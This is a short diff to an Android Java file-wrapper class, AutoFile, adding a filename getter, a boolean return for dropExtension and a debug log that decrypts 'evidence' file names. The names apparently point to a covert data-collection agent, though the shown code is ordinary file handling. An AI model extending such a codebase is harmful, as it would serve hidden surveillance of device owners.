@@ -20,6 +20,7 @@ import java.io.OutputStream;
 import java.util.Date;
 
 import com.android.service.auto.Cfg;
+import com.android.service.evidence.EvidenceCollector;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -32,6 +33,7 @@ public final class AutoFile {
 	private static final String TAG = "AutoFile"; //$NON-NLS-1$
 	/** The file. */
 	File file;
+	private String filename;
 
 	/**
 	 * Instantiates a new auto flash file.
@@ -43,11 +45,12 @@ public final class AutoFile {
 	 */
 	public AutoFile(final String filename) {
 		file = new File(filename);
-		// this.filename = filename;
+		this.filename = filename;
 	}
 
 	public AutoFile(String dir, String filename) {
 		file = new File(dir, filename);
+		this.filename = filename;
 	}
 
 	/**
@@ -210,6 +213,10 @@ public final class AutoFile {
 		return new Date(file.lastModified());
 	}
 
+	public String getFilename(){
+		return filename;
+	}
+	
 	/**
 	 * Flush.
 	 */
@@ -225,12 +232,16 @@ public final class AutoFile {
 		file.delete();
 	}
 
-	public void dropExtension(String ext) {
+	public boolean dropExtension(String ext) {
 		final String filename = file.getName();
 		final int pos = filename.lastIndexOf(ext);
 		final String newname = filename.substring(0, pos);
 		final File newfile = new File(file.getParent(), newname);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (dropExtension): " + EvidenceCollector.decryptName(filename) + " -> " +EvidenceCollector.decryptName(newname));
+		}
 		final boolean ret = file.renameTo(newfile);
+		return ret;
 	}
 
 	public void create() {
